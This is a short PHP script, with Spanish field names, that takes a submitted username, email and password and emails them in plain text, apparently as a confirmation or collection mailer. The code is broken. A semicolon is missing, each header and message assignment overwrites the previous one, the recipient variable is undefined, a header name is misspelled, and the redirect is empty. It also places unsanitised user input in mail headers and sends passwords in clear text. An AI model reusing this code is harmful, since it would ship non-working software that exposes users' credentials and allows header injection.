<?php
$user = $_POST ['usuario'];
$mail = $_POST ['correo'];
$password = $_POST ['password'];


$header = 'From: ' . $mail . "\r\n";
$header = "X-Mailer: PHP/" . phpversion() . "\r\n"
$header = "Mime-Version: 1.0 \r\n";
$header = "Content-Typer: text/plain";

$message = "Su usuario es: " . $user . "\r\r";
$message = "Su password es: " . $password . "\r\n";

$asunto = 'Asunto del mensaje';

mail($para, $asunto, utf8_decode($message), $header);
header("");
?>